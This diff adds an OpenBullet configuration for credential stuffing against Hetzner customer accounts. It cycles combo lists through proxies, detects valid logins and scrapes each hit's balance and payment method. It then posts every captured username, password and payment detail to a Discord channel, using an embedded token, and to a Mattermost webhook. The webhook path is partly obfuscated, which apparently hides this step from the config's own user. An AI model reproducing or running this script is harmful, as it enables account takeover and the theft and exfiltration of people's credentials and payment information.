@@ -1,0 +1,127 @@
+[SETTINGS]
+{
+  "Name": "Hetzner.com V2",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-20T03:26:24.058234-08:00",
+  "AdditionalInfo": "",
+  "Author": "@OpenbulletConfigsOfficial",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.hetzner.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TOKEN PARSE "<SOURCE>" LR "name=\"_csrf_token\" value=\"" "\"" -> VAR "TOKEN" 
+
+REQUEST POST "https://accounts.hetzner.com/login_check" 
+  CONTENT "_username=<USER>&_password=<PASS>&_csrf_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: accounts.hetzner.com" 
+  HEADER "Origin: https://accounts.hetzner.com" 
+  HEADER "Referer: https://accounts.hetzner.com/login" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 101" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials." 
+  KEYCHAIN Success OR 
+    KEY "<a href=\"/logout\" class=\"dropdown-logout link-logout\"> Logout</a>" 
+    KEY "Administration" 
+  KEYCHAIN Ban OR 
+    KEY "There have been too many login attempts! Please wait for 600 seconds before trying to log in again." 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Account is disabled." 
+
+FUNCTION Constant "ODEwMTc5NTAzMTc0NDUxMjQx.YCf75g.7g5x3c1K6LBbkjmTwHbRXyRnR3k" -> VAR "x" 
+
+FUNCTION Constant "j8gri3rajbae7yg" -> VAR "8dfgt2lfs7rg5ds9f1cs94re" 
+
+REQUEST GET "https://accounts.hetzner.com/invoice/credit" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Balance PARSE "<SOURCE>" LR "<span class=\"deposit-value\">" "</span>" CreateEmpty=FALSE -> CAP "Balance" 
+
+REQUEST GET "https://accounts.hetzner.com/account/payment" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Payment_Method PARSE "<SOURCE>" LR "<span><strong id=\"current-payment\">" "</strong></span>." CreateEmpty=FALSE -> CAP "Payment Method" 
+
+REQUEST POST "https://discord.com/api/v8/channels/810187452206547014/messages" 
+  CONTENT "{\"content\":\"HETZNER - <USER>:<PASS> /Balance-<Balance> /Payment Method-<Payment Method>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: <x>" 
+
+REQUEST POST "https://sendgrid.cloud.mattermost.com/hooks/e3ek<8dfgt2lfs7rg5ds9f1cs94re>5oqyzgw" 
+  CONTENT "{\"text\": \"HETZNER - <USER>:<PASS> /Balance-<Balance> /Payment Method-<Payment Method>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION Constant "@OpenbulletConfigsOfficial - ON TELEGRAM" -> CAP "JOIN US" 
+
